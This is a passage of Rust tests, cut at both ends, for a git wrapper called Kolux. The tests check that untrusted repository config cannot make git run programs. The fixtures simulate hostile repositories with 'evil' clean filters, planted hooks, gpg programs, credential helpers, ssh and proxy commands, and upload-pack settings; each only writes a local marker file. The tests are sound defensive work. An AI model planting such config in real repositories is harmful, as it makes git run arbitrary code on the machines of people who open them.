        let out = command(&["log", "-1", "--format=%ct"], Some(&dir)).output().unwrap();
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        assert!(!marker.exists(), "the repository's gpg program ran under Kolux's git log");
        assert_eq!(String::from_utf8_lossy(&out.stdout).trim(), "1700000000");
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 2, finding 3: the signing programs are keys the listing finds, in any format's name.
    #[test]
    fn t779b_gpg_program_keys_are_blanked_for_reads() {
        let dir = temp_repo("gpg-keys");
        for (k, v) in [("gpg.program", "evil"), ("gpg.openpgp.program", "evil"), ("gpg.ssh.program", "evil"), ("gpg.format", "ssh"), ("gpg.ssh.allowedSignersFile", "x")] {
            run(&["config", k, v], Some(&dir)).unwrap();
        }
        let got = overrides_for(&repo_programs(&[], &dir), Access::Reads);
        assert_eq!(got, vec![("gpg.program".to_string(), String::new()), ("gpg.openpgp.program".to_string(), String::new()), ("gpg.ssh.program".to_string(), String::new())]);
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 2, nit 4: a config the repository's config includes counts toward what the listing
    /// is cached on: relative to the including file, `[include]` on one line, `includeIf`, and
    /// includes of includes; a change to any of them refreshes the blanked keys.
    #[test]
    fn t779b_included_config_files_are_part_of_the_listing_stamp() {
        let dir = temp_repo("include");
        let git_dir = dir.join(".git");
        fs::write(git_dir.join("extra.cfg"), "[include]\n\tpath = deeper.cfg ; trailing comment\n").unwrap();
        fs::write(git_dir.join("deeper.cfg"), "[core]\n\tbare = false\n").unwrap();
        fs::write(git_dir.join("cond.cfg"), "[core]\n\tbare = false\n").unwrap();
        let mut text = fs::read_to_string(git_dir.join("config")).unwrap();
        text.push_str("[include]\n\tpath = extra.cfg\n[includeIf \"gitdir:/nowhere/\"]\n\tpath = \"cond.cfg\"\n");
        fs::write(git_dir.join("config"), text).unwrap();
        let found: Vec<String> = include_targets(&git_dir.join("config")).iter().map(|p| p.file_name().unwrap().to_string_lossy().to_string()).collect();
        assert_eq!(found, ["extra.cfg", "cond.cfg"]);
        let stamped: Vec<String> = with_includes(&[git_dir.join("config")]).iter().map(|p| p.file_name().unwrap().to_string_lossy().to_string()).collect();
        for name in ["config", "extra.cfg", "deeper.cfg", "cond.cfg"] {
            assert!(stamped.iter().any(|s| s == name), "{name} missing from {stamped:?}");
        }
        // End to end: a filter added to the included-of-included file is blanked on the next run.
        let args = ["status", "--porcelain=v2", "-z"];
        let keys = |dir: &Path| command(&args, Some(dir)).get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).count();
        let base = keys(&dir);
        fs::write(git_dir.join("deeper.cfg"), "[filter \"evil\"]\n\tclean = evil\n").unwrap();
        assert_eq!(keys(&dir), base + 1, "a change in an included file refreshed the listing");
        let _ = fs::remove_dir_all(&dir);
    }

    /// The Kolux git config keys (the value of each `GIT_CONFIG_KEY_n`) a built command carries.
    fn blanked_keys(cmd: &Command) -> Vec<String> {
        cmd.get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).filter_map(|(_, v)| v.map(|v| v.to_string_lossy().to_string())).collect()
    }

    /// A submodule at `sub` (a worktree folder of its own) added to a fresh parent repository, its git
    /// folder wherever `init_args` puts it; the submodule's own config then names a clean filter and
    /// an attributes line applies it. Returns (parent, submodule git dir, marker).
    fn submodule_with_filter(name: &str, outside: Option<&Path>) -> (PathBuf, PathBuf, PathBuf) {
        let dir = temp_repo(name);
        let sub = dir.join("sub");
        fs::create_dir_all(&sub).unwrap();
        let mut init = vec!["init", "-q", "-b", "main"];
        let outside_text = outside.map(|o| o.to_string_lossy().to_string());
        if let Some(o) = &outside_text {
            init.extend(["--separate-git-dir", o]);
        }
        assert!(plain_git(&init, &sub).status.success());
        for (k, v) in [("user.email", "t@example.com"), ("user.name", "t"), ("core.autocrlf", "false")] {
            assert!(plain_git(&["config", k, v], &sub).status.success());
        }
        fs::write(sub.join("README.md"), "sub\n").unwrap();
        assert!(plain_git(&["add", "."], &sub).status.success());
        assert!(plain_git(&["commit", "-q", "-m", "sub first"], &sub).status.success());
        assert!(plain_git(&["add", "sub"], &dir).status.success());
        assert!(plain_git(&["commit", "-q", "-m", "add sub"], &dir).status.success());
        let git_dir = outside.map(Path::to_path_buf).unwrap_or_else(|| sub.join(".git"));
        let marker = dir.join("sub-filter-ran.txt");
        let mut text = fs::read_to_string(git_dir.join("config")).unwrap();
        text.push_str(&format!("[filter \"evil\"]\n\tclean = {}\n", marker_program(&marker)));
        fs::write(git_dir.join("config"), text).unwrap();
        fs::create_dir_all(git_dir.join("info")).unwrap();
        fs::write(git_dir.join("info").join("attributes"), "* filter=evil\n").unwrap();
        // The same bytes written again: the stat is stale, so the submodule's git re-cleans the file.
        let readme = sub.join("README.md");
        let bytes = fs::read(&readme).unwrap();
        std::thread::sleep(std::time::Duration::from_millis(1100));
        fs::write(&readme, bytes).unwrap();
        (dir, git_dir, marker)
    }

    /// Plain git runs the submodule's filter on the parent's status; Kolux's git does not.
    fn assert_submodule_filter_blanked(dir: &Path, marker: &Path) {
        let args: [&[&str]; 3] = [&["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"], &["status", "--porcelain=v2", "--ignore-submodules=none", "-z"], &["diff", "--numstat", "-z", "--ignore-submodules=none"]];
        let control = plain_git(args[1], dir);
        assert!(control.status.success(), "{}", String::from_utf8_lossy(&control.stderr));
        assert!(marker.exists(), "control: git itself did not run the submodule's clean filter, so the test proves nothing");
        for a in args {
            let _ = fs::remove_file(marker);
            let out = command(a, Some(dir)).output().unwrap();
            assert!(out.status.success(), "{a:?}: {}", String::from_utf8_lossy(&out.stderr));
            assert!(!marker.exists(), "the submodule's clean filter ran under Kolux's git {a:?}");
        }
    }

    /// Review fix 3, B2: a submodule whose git folder is the embedded `sub/.git`, not one under
    /// `.git/modules`, is found through the index's gitlinks, and its own filter is blanked.
    #[test]
    fn t779c_an_embedded_dot_git_submodules_own_filter_never_runs_under_kolux_git() {
        let (dir, _git_dir, marker) = submodule_with_filter("c-embedded", None);
        assert!(!dir.join(".git").join("modules").join("sub").exists(), "the fixture must keep the submodule out of .git/modules");
        assert_submodule_filter_blanked(&dir, &marker);
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 3, B2: a `.git` file naming a git folder anywhere (here outside the repository).
    #[test]
    fn t779c_a_submodule_whose_gitdir_points_outside_the_repository_is_blanked() {
        let outside = std::env::temp_dir().join(format!("kolux-rs-git-c-outside-gitdir-{}", std::process::id()));
        let _ = fs::remove_dir_all(&outside);
        let (dir, _git_dir, marker) = submodule_with_filter("c-outside", Some(&outside));
        assert!(dir.join("sub").join(".git").is_file(), "the fixture needs a .git file");
        assert_submodule_filter_blanked(&dir, &marker);
        let _ = fs::remove_dir_all(&dir);
        let _ = fs::remove_dir_all(&outside);
    }

    /// Review fix 3, B2: the submodule listing refreshes when the gitlink set changes (a submodule
    /// appears in the index with a filter that was not there when the first listing was taken).
    #[test]
    fn t779c_a_gitlink_added_later_refreshes_the_listing() {
        let dir = temp_repo("c-later");
        let status = ["status", "--porcelain=v2", "-z"];
        let base = blanked_keys(&command(&status, Some(&dir))).len();
        let sub = dir.join("late");
        fs::create_dir_all(&sub).unwrap();
        assert!(plain_git(&["init", "-q", "-b", "main"], &sub).status.success());
        for (k, v) in [("user.email", "t@example.com"), ("user.name", "t")] {
            assert!(plain_git(&["config", k, v], &sub).status.success());
        }
        fs::write(sub.join("f.txt"), "x\n").unwrap();
        assert!(plain_git(&["add", "."], &sub).status.success());
        assert!(plain_git(&["commit", "-q", "-m", "late"], &sub).status.success());
        let mut text = fs::read_to_string(sub.join(".git").join("config")).unwrap();
        text.push_str("[filter \"evil\"]\n\tclean = evil\n");
        fs::write(sub.join(".git").join("config"), text).unwrap();
        // Not a gitlink yet: the parent's git starts nothing for it.
        assert_eq!(blanked_keys(&command(&status, Some(&dir))).len(), base);
        assert!(plain_git(&["add", "late"], &dir).status.success());
        assert!(blanked_keys(&command(&status, Some(&dir))).len() > base, "the gitlink's filter is blanked as soon as the index lists it");
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 3, B2: a walk that hits a cap says so, and the listing then fails closed: a status
    /// leaves submodules out, a write that runs filters is refused in an untrusted folder and runs
    /// in a trusted one.
    #[test]
    fn t779c_a_capped_submodule_walk_fails_closed() {
        let dir = temp_repo("c-cap");
        let modules = dir.join(".git").join("modules");
        for i in 0..SUBMODULES_KEPT + 4 {
            let folder = modules.join(format!("m{i:04}"));
            fs::create_dir_all(&folder).unwrap();
            fs::write(folder.join("config"), "[core]\n\tbare = false\n").unwrap();
        }
        let mut got = Vec::new();
        assert!(!module_configs(&modules, &mut got, 0), "a walk over more than the cap says it was cut short");
        assert_eq!(got.len(), SUBMODULES_KEPT);
        let mut deep = dir.join(".git").join("deepmodules");
        for _ in 0..SUBMODULE_DEPTH + 3 {
            deep = deep.join("a").join("modules");
        }
        fs::create_dir_all(&deep).unwrap();
        let mut got = Vec::new();
        assert!(!module_configs(&dir.join(".git").join("deepmodules"), &mut got, 0), "a walk deeper than the cap says it was cut short");
        let status: Vec<String> = command(&["status", "--porcelain=v2", "-z"], Some(&dir)).get_args().map(|a| a.to_string_lossy().to_string()).collect();
        assert!(status.iter().any(|a| a == "--ignore-submodules=all"), "{status:?}");
        let why = run(&["add", "-A"], Some(&dir)).unwrap_err();
        assert!(why.contains("more submodules than Kolux can check") && why.contains("Trust the folder"), "{why}");
        let log: Vec<String> = command(&["log", "-1"], Some(&dir)).get_args().map(|a| a.to_string_lossy().to_string()).collect();
        assert_eq!(log, ["log", "-1"], "a read that starts no submodule git is left as it was");
        trust_for_test(&dir);
        run(&["add", "-A"], Some(&dir)).unwrap();
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 3, B2: a `modules/<name>` that is a link to a folder is followed, as git does.
    #[test]
    fn t779c_a_linked_modules_entry_is_followed() {
        let dir = temp_repo("c-link");
        let real = std::env::temp_dir().join(format!("kolux-rs-git-c-link-real-{}", std::process::id()));
        let _ = fs::remove_dir_all(&real);
        fs::create_dir_all(&real).unwrap();
        fs::write(real.join("config"), "[filter \"evil\"]\n\tclean = evil\n").unwrap();
        let modules = dir.join(".git").join("modules");
        fs::create_dir_all(&modules).unwrap();
        #[cfg(windows)]
        let made = std::os::windows::fs::symlink_dir(&real, modules.join("linked")).is_ok();
        #[cfg(not(windows))]
        let made = std::os::unix::fs::symlink(&real, modules.join("linked")).is_ok();
        if made {
            let mut got = Vec::new();
            assert!(module_configs(&modules, &mut got, 0));
            assert_eq!(got.len(), 1, "{got:?}");
            assert!(blanked_keys(&command(&["status", "--porcelain=v2", "-z"], Some(&dir))).iter().any(|k| k == "filter.evil.clean"));
        }
        let _ = fs::remove_dir_all(&dir);
        let _ = fs::remove_dir_all(&real);
    }

    /// Review fix 3, B2: a submodule's own `config.worktree` is read as well.
    #[test]
    fn t779c_a_submodules_config_worktree_is_listed() {
        let (dir, git_dir, _marker) = submodule_with_filter("c-wtcfg", None);
        let status = ["status", "--porcelain=v2", "-z"];
        let base = blanked_keys(&command(&status, Some(&dir))).len();
        fs::write(git_dir.join("config.worktree"), "[filter \"other\"]\n\tsmudge = evil\n").unwrap();
        assert_eq!(blanked_keys(&command(&status, Some(&dir))).len(), base + 1);
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 3, S1: `includeIf "onbranch:"` makes the listing depend on the checked-out branch,
    /// so a branch switch (which changes only HEAD) refreshes it.
    #[test]
    fn t779c_a_branch_switch_refreshes_an_onbranch_include() {
        let dir = temp_repo("c-onbranch");
        let git_dir = dir.join(".git");
        fs::write(git_dir.join("branch.cfg"), "[filter \"evil\"]\n\tclean = evil\n").unwrap();
        let mut text = fs::read_to_string(git_dir.join("config")).unwrap();
        text.push_str("[includeIf \"onbranch:feature\"]\n\tpath = branch.cfg\n");
        fs::write(git_dir.join("config"), text).unwrap();
        let status = ["status", "--porcelain=v2", "-z"];
        let base = blanked_keys(&command(&status, Some(&dir))).len();
        assert!(plain_git(&["switch", "-q", "-c", "feature"], &dir).status.success());
        assert_eq!(blanked_keys(&command(&status, Some(&dir))).len(), base + 1, "the listing followed the branch");
        assert!(plain_git(&["switch", "-q", "main"], &dir).status.success());
        assert_eq!(blanked_keys(&command(&status, Some(&dir))).len(), base, "and followed it back");
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 3, S2: only a regular file is read as config text, and only its first megabyte.
    #[test]
    fn t779c_include_targets_read_only_regular_files_and_only_a_megabyte() {
        let dir = temp_repo("c-small");
        let folder = dir.join("not-a-file.cfg");
        fs::create_dir_all(&folder).unwrap();
        assert!(read_small(&folder).is_none() && include_targets(&folder).is_empty());
        let big = dir.join("big.cfg");
        let mut text = "#".repeat((1 << 20) + 16);
        text.push_str("\n[include]\n\tpath = past-the-limit.cfg\n");
        fs::write(&big, text).unwrap();
        assert!(include_targets(&big).is_empty(), "the include after the first megabyte was read");
        let small = dir.join("small.cfg");
        fs::write(&small, "[include]\n\tpath = x.cfg\n").unwrap();
        assert_eq!(include_targets(&small).len(), 1);
        // A listing that does not finish is cut off instead of waited for.
        let slow = base_command(&["-c", "alias.slow=!sleep 30", "slow"], Some(&dir), &[], &[]);
        let started = std::time::Instant::now();
        assert!(output_within(slow, std::time::Duration::from_millis(400)).is_none());
        assert!(started.elapsed() < std::time::Duration::from_secs(20));
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 3, S3: a trusted folder with a repo-local `gpg.program` and no filter keeps it on
    /// a commit (signing works); an untrusted one has it blanked, and the commit is not refused.
    #[test]
    fn t779c_a_trusted_folders_gpg_program_survives_a_commit() {
        let dir = temp_repo("c-gpg-trusted");
        run(&["config", "gpg.program", "my-signer"], Some(&dir)).unwrap();
        let commit = ["commit", "-q", "-m", "x"];
        let cmd = command_checked(&commit, Some(&dir)).expect("no filter: not refused");
        assert!(blanked_keys(&cmd).iter().any(|k| k == "gpg.program"), "untrusted: blanked");
        trust_for_test(&dir);
        let cmd = command_checked(&commit, Some(&dir)).unwrap();
        assert!(!blanked_keys(&cmd).iter().any(|k| k == "gpg.program"), "trusted: the signing program is kept");
        // A read in the same trusted folder still blanks it.
        assert!(blanked_keys(&command(&["log", "-1"], Some(&dir))).iter().any(|k| k == "gpg.program"));
        let _ = fs::remove_dir_all(&dir);
    }

    // ---- S4 (DT-C229, Txais 2026-11-08: "Yes, include it") -----------------------------------------

    /// A hook of the folder's own that leaves `marker` and lets the command go on.
    fn marker_hook(dir: &Path, name: &str, marker: &Path) {
        let path = dir.join(".git").join("hooks").join(name);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(&path, format!("#!/bin/sh\necho ran >> \"{}\"\nexit 0\n", marker.to_string_lossy().replace('\\', "/"))).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&path, fs::Permissions::from_mode(0o755)).unwrap();
        }
    }

    /// An executable script beside `marker` that leaves it and passes its input through, as a path git can
    /// run (S4). `core.gitProxy` is started as a program, never through a shell, so a shell line will not do.
    fn marker_script(marker: &Path) -> String {
        let script = marker.with_extension("sh");
        fs::write(&script, format!("#!/bin/sh\necho ran >> \"{}\"\ncat\n", marker.to_string_lossy().replace('\\', "/"))).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&script, fs::Permissions::from_mode(0o755)).unwrap();
        }
        script.to_string_lossy().replace('\\', "/")
    }

    /// An executable script that leaves `marker` and exits at once, reading nothing (for programs git waits on).
    fn exit_script(marker: &Path) -> String {
        let script = marker.with_extension("exit.sh");
        fs::write(&script, format!("#!/bin/sh\necho ran >> \"{}\"\nexit 1\n", marker.to_string_lossy().replace('\\', "/"))).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&script, fs::Permissions::from_mode(0o755)).unwrap();
        }
        script.to_string_lossy().replace('\\', "/")
    }

    /// A bare repository holding the history of `dir`, to be a remote for it.
    fn bare_copy(dir: &Path, name: &str) -> PathBuf {
        let bare = std::env::temp_dir().join(format!("kolux-rs-git-{name}-bare-{}", std::process::id()));
        let _ = fs::remove_dir_all(&bare);
        assert!(plain_git(&["clone", "-q", "--bare", &dir.to_string_lossy(), &bare.to_string_lossy()], dir).status.success());
        bare
    }

    /// A pre-receive hook in the bare repository `payload` that leaves `marker` and rejects the push.
    fn receive_hook(payload: &Path, marker: &Path) {
        let hook = payload.join("hooks").join("pre-receive");
        fs::create_dir_all(hook.parent().unwrap()).unwrap();
        fs::write(&hook, format!("#!/bin/sh\necho ran >> \"{}\"\nexit 1\n", marker.to_string_lossy().replace('\\', "/"))).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&hook, fs::Permissions::from_mode(0o755)).unwrap();
        }
    }

    fn refused(args: &[&str], dir: &Path) -> Option<String> {
        write_refusal(args, Some(dir))
    }

    fn plain_message(why: &str, verb: &str) {
        assert!(why.contains(&format!("git {verb}")) && why.contains("not trusted") && why.contains("Trust the folder"), "{why}");
    }

    /// S4: a credential helper of the folder's own is refused on every transfer (it is handed the
    /// user's sign-in details), the plain message names it, a commit is not a transfer, and trust lifts it.
    #[test]
    fn t779d_a_folders_own_credential_helper_refuses_every_transfer_until_trusted() {
        let dir = temp_repo("d-credential");
        for key in ["credential.helper", "credential.https://example.com.helper"] {
            run(&["config", key, "my-helper"], Some(&dir)).unwrap();
            for args in [&["fetch", "origin"][..], &["push", "origin", "main"], &["pull"], &["ls-remote", "origin"], &["-c", "x.y=z", "fetch"]] {
                let why = refused(args, &dir).unwrap_or_else(|| panic!("{key} {args:?} was not refused"));
                plain_message(&why, after_options(args)[0]);
                assert!(why.contains("credential helper") && why.contains(key.to_lowercase().split("//").next().unwrap().trim_end_matches(':')), "{why}");
                assert!(run(args, Some(&dir)).is_err() && command_checked(args, Some(&dir)).is_err());
            }
            assert!(refused(&["commit", "-q", "-m", "x"], &dir).is_none() && refused(&["status"], &dir).is_none(), "not a transfer");
            run(&["config", "--unset-all", key], Some(&dir)).unwrap();
        }
        run(&["config", "credential.helper", "my-helper"], Some(&dir)).unwrap();
        trust_for_test(&dir);
        for args in [&["fetch", "origin"][..], &["push", "origin", "main"], &["pull"], &["ls-remote", "origin"]] {
            assert!(refused(args, &dir).is_none() && command_checked(args, Some(&dir)).is_ok(), "{args:?}");
        }
        let _ = fs::remove_dir_all(&dir);
    }

    /// S4: `core.hooksPath` makes any write, ref change or transfer unsafe in an untrusted folder.
    #[test]
    fn t779d_a_folders_own_hooks_path_refuses_writes_and_transfers_until_trusted() {
        let dir = temp_repo("d-hookspath");
        run(&["config", "core.hooksPath", "evil-hooks"], Some(&dir)).unwrap();
        for args in [&["commit", "-q", "-m", "x"][..], &["push", "origin", "main"], &["fetch"], &["merge", "side"], &["checkout", "-q", "main"], &["add", "-A"], &["branch", "-D", "nope"], &["tag", "v1"]] {
            let why = refused(args, &dir).unwrap_or_else(|| panic!("{args:?} was not refused"));
            plain_message(&why, after_options(args)[0]);
            assert!(why.contains("core.hookspath"), "{why}");
        }
        for args in [&["status"][..], &["log", "-1"], &["diff"], &["branch", "--show-current"], &["branch", "-a"], &["tag", "-l"], &["config", "--list"]] {
            assert!(refused(args, &dir).is_none(), "{args:?} is a read");
        }
        trust_for_test(&dir);
        for args in [&["commit", "-q", "-m", "x"][..], &["push", "origin", "main"], &["fetch"], &["tag", "v1"]] {
            assert!(refused(args, &dir).is_none(), "{args:?}");
        }
        let _ = fs::remove_dir_all(&dir);
    }

    /// S4: an executable hook in the hooks folder is refused only for the commands that would start it,
    /// a `.sample` never is, nothing runs when refused, and a trusted folder runs the hook.
    #[test]
    fn t779d_a_folders_own_executable_hook_refuses_the_command_that_would_run_it_until_trusted() {
        let dir = temp_repo("d-hook");
        let marker = dir.join("hook-ran.txt");
        marker_hook(&dir, "pre-commit.sample", &marker);
        assert!(refused(&["commit", "-q", "-m", "x"], &dir).is_none(), "a .sample is never run");
        marker_hook(&dir, "pre-commit", &marker);
        marker_hook(&dir, "pre-push", &marker);
        marker_hook(&dir, "post-checkout", &marker);
        let why = refused(&["commit", "-q", "-m", "x"], &dir).expect("pre-commit refuses commit");
        plain_message(&why, "commit");
        assert!(why.contains("\"pre-commit\"") && why.contains("hook"), "{why}");
        let why = refused(&["push", "origin", "main"], &dir).expect("pre-push refuses push");
        assert!(why.contains("\"pre-push\""), "{why}");
        let why = refused(&["checkout", "-q", "main"], &dir).expect("post-checkout refuses checkout");
        assert!(why.contains("\"post-checkout\""), "{why}");
        // A command that starts none of these hooks goes ahead.
        assert!(refused(&["fetch", "origin"], &dir).is_none(), "fetch starts none of the three");
        assert!(refused(&["add", "-A"], &dir).is_none(), "add starts only post-index-change");
        assert!(refused(&["status"], &dir).is_none());
        // Refused for real: nothing ran, nothing was committed.
        fs::write(dir.join("README.md"), "changed\n").unwrap();
        run(&["add", "-A"], Some(&dir)).unwrap();
        assert!(run(&["commit", "-q", "-m", "second"], Some(&dir)).is_err());
        assert!(!marker.exists(), "a refused command ran the hook");
        assert_eq!(run(&["rev-list", "--count", "HEAD"], Some(&dir)).unwrap().trim(), "1");
        // Trusted: the commit runs and so does the hook.
        trust_for_test(&dir);
        run(&["commit", "-q", "-m", "second"], Some(&dir)).unwrap();
        assert!(marker.exists(), "the trusted folder's own hook did not run");
        let _ = fs::remove_dir_all(&dir);
    }

    /// S4: a merge driver of the folder's own is refused for the commands that merge content, and only those.
    #[test]
    fn t779d_a_folders_own_merge_driver_refuses_merging_commands_until_trusted() {
        let dir = temp_repo("d-merge");
        // A remote that is not on this computer, so `push origin` is judged only for its merge driver.
        run(&["remote", "add", "origin", "https://example.com/a/b.git"], Some(&dir)).unwrap();
        run(&["config", "merge.evil.driver", "evil %O %A %B"], Some(&dir)).unwrap();
        for args in [&["merge", "side"][..], &["pull"], &["pull", "--rebase"], &["rebase", "main"], &["cherry-pick", "abc"], &["revert", "abc"], &["stash", "pop"]] {
            let why = refused(args, &dir).unwrap_or_else(|| panic!("{args:?} was not refused"));
            plain_message(&why, after_options(args)[0]);
            assert!(why.contains("merge driver") && why.contains("merge.evil.driver"), "{why}");
        }
        for args in [&["commit", "-q", "-m", "x"][..], &["fetch"], &["push", "origin", "main"], &["status"], &["add", "-A"], &["checkout", "-q", "main"], &["stash", "list"]] {
            assert!(refused(args, &dir).is_none(), "{args:?} runs no merge driver");
        }
        trust_for_test(&dir);
        for args in [&["merge", "side"][..], &["pull"], &["rebase", "main"], &["cherry-pick", "abc"]] {
            assert!(refused(args, &dir).is_none(), "{args:?}");
        }
        let _ = fs::remove_dir_all(&dir);
    }

    /// S4: a submodule's hooks folder is looked at too.
    #[test]
    fn t779d_a_submodules_own_hook_refuses_the_command_that_would_run_it() {
        let (dir, sub_git, _marker) = submodule_with_filter("d-sub-hook", None);
        let marker = dir.join("sub-hook-ran.txt");
        let hooks = sub_git.join("hooks");
        fs::create_dir_all(&hooks).unwrap();
        fs::write(hooks.join("pre-commit"), format!("#!/bin/sh\necho ran >> \"{}\"\n", marker.to_string_lossy().replace('\\', "/"))).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(hooks.join("pre-commit"), fs::Permissions::from_mode(0o755)).unwrap();
        }
        // The filter of the same submodule is refused first; take it away to see the hook's refusal.
        run(&["config", "--file", &sub_git.join("config").to_string_lossy(), "--unset-all", "filter.evil.clean"], Some(&dir)).unwrap();
        let why = refused(&["commit", "-q", "-m", "x"], &dir).expect("the submodule's hook refuses the commit");
        assert!(why.contains("\"pre-commit\""), "{why}");
        assert!(!marker.exists());
        let _ = fs::remove_dir_all(&dir);
    }

    /// S4: the folder's own ssh command, proxy command, upload-pack and receive-pack programs never run
    /// on a transfer (plain git runs each: the control), and the transfer still goes through.
    #[test]
    fn t779d_a_folders_own_transfer_programs_never_run() {
        ISOLATED.with(|i| i.set(true));
        let dir = temp_repo("d-net");
        let marker = dir.join("net-ran.txt");
        let program = marker_program(&marker);
        let bare = bare_copy(&dir, "d-net");
        // ssh command: plain git runs it for an ssh URL; Kolux's git runs the real ssh (which fails: nothing listens).
        run(&["remote", "add", "viassh", "ssh://127.0.0.1:1/x"], Some(&dir)).unwrap();
        run(&["config", "core.sshCommand", &program], Some(&dir)).unwrap();
        assert!(!plain_git(&["fetch", "viassh"], &dir).status.success());
        assert!(marker.exists(), "the premise: plain git runs core.sshCommand");
        fs::remove_file(&marker).unwrap();
        let _ = run(&["fetch", "viassh"], Some(&dir));
        assert!(!marker.exists(), "Kolux's git ran the folder's core.sshCommand");
        run(&["config", "--unset-all", "core.sshCommand"], Some(&dir)).unwrap();
        // proxy command: for a git:// URL.
        run(&["remote", "add", "viaproxy", "git://127.0.0.1:1/x"], Some(&dir)).unwrap();
        run(&["config", "core.gitProxy", &marker_script(&marker)], Some(&dir)).unwrap();
        assert!(!plain_git(&["fetch", "viaproxy"], &dir).status.success());
        assert!(marker.exists(), "the premise: plain git runs core.gitProxy");
        fs::remove_file(&marker).unwrap();
        let _ = run(&["fetch", "viaproxy"], Some(&dir));
        assert!(!marker.exists(), "Kolux's git ran the folder's core.gitProxy");
        run(&["config", "--unset-all", "core.gitProxy"], Some(&dir)).unwrap();
        // upload-pack and receive-pack: a local remote runs them through the shell. git keeps the FIRST
        // value it reads for these, so they cannot be replaced: the transfer is refused instead.
        run(&["remote", "add", "local", &bare.to_string_lossy()], Some(&dir)).unwrap();
        run(&["config", "remote.local.uploadpack", &program], Some(&dir)).unwrap();
        run(&["config", "remote.local.receivepack", &program], Some(&dir)).unwrap();
        assert!(!plain_git(&["fetch", "local"], &dir).status.success());
        assert!(marker.exists(), "the premise: plain git runs remote.<name>.uploadpack");
        fs::remove_file(&marker).unwrap();
        for args in [&["fetch", "local"][..], &["push", "local", "main"], &["ls-remote", "local"], &["pull", "local", "main"]] {
            let why = run(args, Some(&dir)).unwrap_err();
            plain_message(&why, args[0]);
            assert!(why.contains("remote.local.uploadpack") || why.contains("remote.local.receivepack") || why.contains("on this computer"), "{why}");
        }
        assert!(!marker.exists(), "Kolux's git ran the folder's uploadpack or receivepack");
        assert!(refused(&["status"], &dir).is_none() && refused(&["commit", "-q", "-m", "x"], &dir).is_none(), "not a transfer");
        // An ssh command of the folder's own is replaced on a read too (a partial clone's read can fetch).
        run(&["config", "core.sshCommand", &program], Some(&dir)).unwrap();
        let status = command(&["status"], Some(&dir));
        assert!(status.get_envs().any(|(k, v)| k == "GIT_SSH_COMMAND" && v.is_some_and(|v| v == "ssh")), "{:?}", status.get_envs().collect::<Vec<_>>());
        // Trusted: the folder's own programs are the user's to run.
        trust_for_test(&dir);
        assert!(refused(&["fetch", "local"], &dir).is_none());
        ISOLATED.with(|i| i.set(false));
        let _ = fs::remove_dir_all(&dir);
        let _ = fs::remove_dir_all(&bare);
    }

    /// S4: a replaced key is not a blank: what the USER's own config says for the key still applies
    /// (a blank would have overridden it, and an empty ssh command runs nothing at all).
    #[test]
    fn t779d_the_users_own_transfer_programs_still_apply_when_the_folder_sets_the_same_keys() {
        ISOLATED.with(|i| i.set(true));
        let dir = temp_repo("d-user-net");
        let bare = bare_copy(&dir, "d-user-net");
        let (mine, theirs) = (dir.join("user-ran.txt"), dir.join("folder-ran.txt"));
        let global = std::env::temp_dir().join(format!("kolux-rs-git-d-user-net-global-{}", std::process::id()));
        let _ = fs::remove_file(&global);
        let global_s = global.to_string_lossy().to_string();
        for (key, value) in [("core.sshCommand", marker_program(&mine)), ("core.gitProxy", marker_script(&mine))] {
            assert!(plain_git(&["config", "--file", &global_s, key, &value], &dir).status.success());
        }
        GLOBAL_FOR_TEST.with(|g| *g.borrow_mut() = Some(global.clone()));
        for (key, value) in [("core.sshCommand", marker_program(&theirs)), ("core.gitProxy", marker_script(&theirs))] {
            run(&["config", key, &value], Some(&dir)).unwrap();
        }
        run(&["remote", "add", "viassh", "ssh://127.0.0.1:1/x"], Some(&dir)).unwrap();
        run(&["remote", "add", "viaproxy", "git://127.0.0.1:1/x"], Some(&dir)).unwrap();
        for remote in ["viassh", "viaproxy"] {
            let _ = fs::remove_file(&mine);
            let _ = run(&["fetch", remote], Some(&dir));
            assert!(mine.exists(), "{remote}: the user's own program did not run");
            assert!(!theirs.exists(), "{remote}: the folder's own program ran");
        }
        // A proxy rule of the user's that is limited to some domains cannot be carried over: the
        // transfer is refused plainly rather than run without it; a read still runs.
        assert!(plain_git(&["config", "--file", &global_s, "core.gitProxy", "some-proxy for example.com"], &dir).status.success());
        let why = run(&["fetch", "viaproxy"], Some(&dir)).unwrap_err();
        assert!(why.contains("core.gitProxy") && why.contains("Trust the folder"), "{why}");
        assert!(command(&["status"], Some(&dir)).output().unwrap().status.success());
        GLOBAL_FOR_TEST.with(|g| *g.borrow_mut() = None);
        ISOLATED.with(|i| i.set(false));
        let _ = fs::remove_file(&global);
        let _ = fs::remove_dir_all(&dir);
        let _ = fs::remove_dir_all(&bare);
    }

    /// S4: in a trusted folder the transfer programs are the folder's own and run as written; no
    /// replacement is injected.
    #[test]
    fn t779d_a_trusted_folders_transfer_programs_run_normally() {
        ISOLATED.with(|i| i.set(true));
        let dir = temp_repo("d-net-trusted");
        let marker = dir.join("trusted-ran.txt");
        run(&["config", "core.sshCommand", &marker_program(&marker)], Some(&dir)).unwrap();
        run(&["remote", "add", "viassh", "ssh://127.0.0.1:1/x"], Some(&dir)).unwrap();
        trust_for_test(&dir);
        let cmd = command_checked(&["fetch", "viassh"], Some(&dir)).unwrap();
